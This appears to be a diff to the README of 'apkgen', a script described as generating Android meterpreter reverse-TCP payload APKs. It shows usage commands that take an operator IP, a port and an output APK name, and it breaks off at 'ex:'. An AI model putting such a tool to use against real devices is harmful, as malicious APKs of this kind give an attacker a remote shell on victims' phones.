@@ -1,7 +1,10 @@
 # apkgen
 Android meterpreter payload generator script using reverse tcp connection protocol
+
 cd apkgen
+
 chmod +x apkgen
+
 ./apkgen your_ip your_port filename.apk
 
 ex:
